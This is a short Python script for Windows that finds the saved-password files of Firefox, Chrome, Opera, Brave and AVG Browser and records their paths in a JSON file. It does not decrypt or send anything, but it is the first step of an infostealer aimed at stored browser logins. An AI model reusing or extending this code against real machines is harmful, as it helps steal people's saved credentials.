import os
import getpass
import json

os_drive = os.environ.get("SystemDrive")
print(os_drive)
username = getpass.getuser()
userfolder = f"C:\\Users\\{username}"
AppData = f"{userfolder}\\AppData"

firefox_folder = f"{AppData}\\Roaming\\Mozilla\\Firefox\\Profiles\\"
chrome_folder = f"{AppData}\\Local\\Google\\Chrome\\User Data\\Default\\"
opera_folder = f"{AppData}\\Roaming\\Opera Software\\Opera Stable"
brave_folder = f"{AppData}\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default"
avg_folder = f"{AppData}\\Local\\AVG\\Browser\\User Data\\Default"

def check_firefox_pw():
    if os.path.exists(firefox_folder):
        os.chdir(firefox_folder)

        for folder in os.listdir():
            if ".default-release" in folder and os.path.exists(f"{firefox_folder}\\{folder}\\logins.json"):
                os.chdir(f"{firefox_folder}\\{folder}")
                firefox_saved_passwords = os.getcwd()
                print(firefox_saved_passwords)
                return firefox_saved_passwords
            else:
                continue
        
def check_chromium_pw(browser_folder):
    if os.path.exists(browser_folder):
        os.chdir(browser_folder)
        
        if os.path.exists(f"{browser_folder}\\Login Data"):
            browser_saved_pw = browser_folder + "\\Login Data"
            print(browser_saved_pw)
            return browser_saved_pw
    
    else:
        browser_saved_pw = None
        print(browser_saved_pw)
        return browser_saved_pw

results = {
    "chrome": check_chromium_pw(chrome_folder),
    "opera": check_chromium_pw(opera_folder),
    "brave": check_chromium_pw(brave_folder),
    "avg": check_chromium_pw(avg_folder),
    "firefox": check_firefox_pw()
}

with open ("browser_pw_paths.json", "w") as f:
    json.dump(results, f)